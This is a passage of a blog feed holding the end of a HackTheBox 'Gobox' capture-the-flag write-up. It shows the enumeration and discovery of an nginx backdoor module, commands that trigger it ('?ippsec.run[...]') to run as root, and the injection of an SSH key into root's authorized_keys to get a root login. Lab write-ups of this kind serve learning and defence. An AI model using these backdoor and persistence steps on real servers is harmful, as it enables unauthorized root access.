+<span class="c1"># unknown
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>The server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 (with auth)-&gt;host:9000-&gt;container-localstack:4566). To confirm that, I run another scan against port 4566, and nmap shows that it&rsquo;s open, but the access is forbidden.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ nmap -sV -sC -p4566 10.10.11.113
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
+Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
+Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE VERSION
+4566/tcp open  http    nginx
+<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
+</code></pre></div><p>But if I add the authorization header, I get the following results:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbm
+</span><span class="s1">dFc3BvcnRz&#39;</span>
+*   Trying 10.10.11.113:4566...
+* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; GET / HTTP/1.1
+&gt; Host: 10.10.11.113:4566
+&gt; User-Agent: curl/7.74.0
+&gt; Accept: */*
+&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span class="m">404</span>
+&lt; Server: nginx
+&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+&lt; Content-Length: <span class="m">21</span>
+&lt; Connection: keep-alive
+&lt; access-control-allow-origin: *
+&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
+&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
+&lt; access-control-expose-headers: x-amz-version-id
+&lt;
+* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
+<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
+</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
+<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
+www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
+Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
+/
+HTTP/1.1 <span class="m">400</span> Bad Request
+Server: nginx
+Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
+Content-Type: text/html
+Content-Length: <span class="m">150</span>
+Connection: close
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on Aug. 26 at the same time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
+total <span class="m">64</span>
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
+</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name, &ldquo;backdoor&rdquo;!.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
+total <span class="m">12</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
+</code></pre></div><p>The module load a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I find that file under <code>/usr/lib/nginx/modules/</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
+load_module modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
+/usr/lib/nginx/modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
+/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
+</code></pre></div><p>I try to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
+$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
+ngx_pcalloc
+__ctype_b_loc
+realloc
+malloc
+ngxexecute_strncpy_alloc
+ngxexecute_strcpy_alloc
+~iHc
+/home/ubuntu/NginxExecute//ngx_result.c
+7src
+!w<span class="s2">&#34;c
+</span><span class="s2">I%&amp;c
+</span><span class="s2">I=&amp;c
+</span><span class="s2">?src
+</span><span class="s2">3src
+</span><span class="s2">3src
+</span><span class="s2">ngx_http_execute_module.c
+</span><span class="s2">ngx_process.c
+</span><span class="s2">ngx_result.c
+</span><span class="s2">ngx_http_execute_module_modules.c
+</span><span class="s2">ngx_pcalloc
+</span><span class="s2">pcre32_malloc
+</span><span class="s2">timespec
+</span><span class="s2">pcre_malloc
+</span><span class="s2">nalloc
+</span><span class="s2">start_msec
+</span><span class="s2">pcre16_malloc
+</span><span class="s2">async
+</span><span class="s2">pcre32_stack_malloc
+</span><span class="s2">tv_nsec
+</span><span class="s2">ngx_argc
+</span><span class="s2">pcre16_stack_malloc
+</span><span class="s2">valid_msec
+</span><span class="s2">/home/ubuntu/NginxExecute//ngx_http_execute_module.c
+</span><span class="s2">valid_sec
+</span><span class="s2">pcre_stack_malloc
+</span><span class="s2">tv_sec
+</span><span class="s2">ngx_current_msec
+</span><span class="s2">proc
+</span><span class="s2">start_sec
+</span><span class="s2">error_sec
+</span><span class="s2">updating_sec
+</span><span class="s2">__ctype_b_loc
+</span><span class="s2">/home/ubuntu/NginxExecute//ngx_process.c
+</span><span class="s2">__src
+</span><span class="s2">ngxexecute_strncpy_alloc
+</span><span class="s2">ngxexecute_strcpy_alloc
+</span><span class="s2">realloc
+</span><span class="s2">/home/ubuntu/NginxExecute//ngx_result.c
+</span><span class="s2">objs/ngx_http_execute_module_modules.c
+</span><span class="s2">crtstuff.c
+</span><span class="s2">ngx_http_execute_module.c
+</span><span class="s2">ngx_process.c
+</span><span class="s2">ngx_result.c
+</span><span class="s2">ngx_http_execute_module_modules.c
+</span><span class="s2">ngxexecute_strncpy_alloc
+</span><span class="s2">ngxexecute_strcpy_alloc
+</span><span class="s2">ngx_pcalloc
+</span><span class="s2">.plt.sec
+</span><span class="s2">.dynamic
+</span><span class="s2">.debug_loc
+</span></code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
+<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
+*   Trying 127.0.0.1:8000...
+* TCP_NODELAY <span class="nb">set</span>
+* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
+&gt; Host: 127.0.0.1:8000
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt;
+* Empty reply from server
+* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
+$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
+ippsec.run
+</code></pre></div><p>Now If I send <code>?ippsec.run[whoami]</code>, it returns:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
+root
+</code></pre></div><p>Using previous backdoor, I could get an interactive shell access as root, but then the shell exited by itself.</p>
+<p><div class="img-container"><img src="../../../../../ctf/htb/machines/active-boxes/gobox/imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
+</p>
+<p>So instead, I  inject my SSH public key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
+www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
+</code></pre></div><p>Now I can SSH login as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ ssh root@10.10.11.113
+Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC
+
+  System load:                      0.0
+  Usage of /:                       37.1% of 9.72GB
+  Memory usage:                     20%
+  Swap usage:                       0%
+  Processes:                        <span class="m">244</span>
+  Users logged in:                  <span class="m">0</span>
+  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
+  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
+  IPv4 address <span class="k">for</span> ens160:          10.10.11.113
+
+
+<span class="m">0</span> updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for</span> new updates run: sudo apt update
+
+Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
+root@gobox:~#
+</code></pre></div><p>And I can grab the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
+total <span class="m">12</span>
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
+-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
+drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
+root@gobox:~# cat root.txt
+81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h2 id="explore">Explore</h2>
+<h3 id="undetected-ports">Undetected ports</h3>
+<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
+</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules that drop any connection coming to these ports.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
+Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
+target     prot opt <span class="nb">source</span>               destination         
+ACCEPT     all  --  localhost/8          anywhere            
+ACCEPT     all  --  172.16.0.0/12        anywhere            
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>Shouldn&rsquo;t it then return with <code>filtered</code> status?</p>
+<p>Well it was purely my mistake, I used <code>--min-rate=10000</code>. This could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
+<h3 id="gobox-request-routing">Gobox Request Routing</h3>
+<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
+<p>Now with root access obtained, I could understand what was happening. It was synchronization!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
+/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
+/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
+</code></pre></div><p>So If I upload something into the bucket, the host will have it as well.</p>
+<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
+<p><div class="img-container"><img src="imgs/image-20210910091542849.png" alt="image-20210910091542849"  /></div>
+</p>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Doctor</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-doctor/</link>
